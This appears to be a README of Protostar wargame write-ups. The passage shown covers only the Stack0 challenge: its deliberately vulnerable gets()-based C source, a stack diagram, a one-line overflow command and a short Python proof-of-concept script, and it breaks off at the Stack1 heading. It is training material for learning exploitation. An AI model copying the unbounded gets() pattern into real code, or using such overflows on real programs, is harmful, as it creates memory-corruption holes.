# protostar
protostar sploits and solutions 
https://exploit-exercises.com/protostar

NOTE: write ups in progress. Adding python exploit poc's to each excercise for practice!

##Stack0
Source Code:
```C
int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```
###Stack looks like:
 ---------------------------------------
| eip | ebp | modified(0) |   buffer    |
 ---------------------------------------
###The plan:
fill buffer with gets 
since buffer = 64 bytes, an input of 65 bytes should overflow and overwrite modified

###winning command:
```bash
python -c "print 'a'*64+'1'" | ./stack0
```
###Python exploit script for this challenge
```Python
from subprocess import Popen, PIPE
################
buffer = 64
fill = "A"*buffer
input=fill+"1"
#################
cproc = Popen("./stack0", stdin=PIPE, stdout=PIPE)
print cproc.communicate(input)[0]
```

---------------------------------------------------------------------------------------------------------------------
##Stack1

